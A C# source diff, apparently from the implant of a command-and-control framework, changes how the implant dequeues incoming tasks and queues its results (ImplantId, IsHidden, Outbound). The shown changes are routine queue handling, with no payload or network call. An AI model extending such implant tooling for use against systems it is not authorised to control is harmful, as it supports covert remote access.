@@ -5,6 +5,8 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using DynamicEngLoading;
+using Engineer.Functions;
+using static System.Windows.Forms.VisualStyles.VisualStyleElement.TrackBar;
 
 namespace Engineer.Models
 {
@@ -31,6 +33,7 @@ namespace Engineer.Models
 			{
 				outbound.Add(task);
             }
+			//Console.WriteLine($"{DateTime.Now} removed {outbound.Count} tasks from queue");
 			return outbound;
 		}
 
@@ -56,30 +59,50 @@ namespace Engineer.Models
 			while (Inbound.TryDequeue(out var task))
 			{
 				list.Add(task);
-            }
+			}
 
 			tasks = list;
 			return true;
 
 		}
 
-		public void SentData(EngineerTaskResult result, bool isDataChunked)
+        public async Task CheckForDataProcess()
+        {
+            var list = new List<EngineerTask>();
+            while (Inbound.TryDequeue(out var task))
+            {
+                list.Add(task);
+            }
+            Tasking.DealWithTasks(list);
+        }
+
+        public void SentData(EngineerTaskResult result, bool isDataChunked)
 		{
+			var newResult = new EngineerTaskResult
+            {
+                Id = result.Id,
+                Command = result.Command,
+                Result = result.Result,
+                IsHidden = result.IsHidden,
+                Status = result.Status,
+                ImplantId = result.ImplantId,
+                ResponseType = result.ResponseType,
+            };
             if (isDataChunked)
             {
-				Outbound.Enqueue(result);
+				Outbound.Enqueue(newResult);
 				return;
             }
             //if the result is already in the Outbound queue then append the result to the existing result and update the status
-            if (Outbound.Any(t => t.Id == result.Id))
+            if (Outbound.Any(t => t.Id == newResult.Id))
 			{
-				var existingResult = Outbound.FirstOrDefault(t => t.Id == result.Id);
-				existingResult.Result = existingResult.Result.Concat(result.Result).ToArray();
-				existingResult.Status = result.Status;
+				var existingResult = Outbound.FirstOrDefault(t => t.Id == newResult.Id);
+				existingResult.Result = existingResult.Result.Concat(newResult.Result).ToArray();
+				existingResult.Status = newResult.Status;
 			}
 			else
 			{
-				Outbound.Enqueue(result);
+				Outbound.Enqueue(newResult);
 			}
         }
 
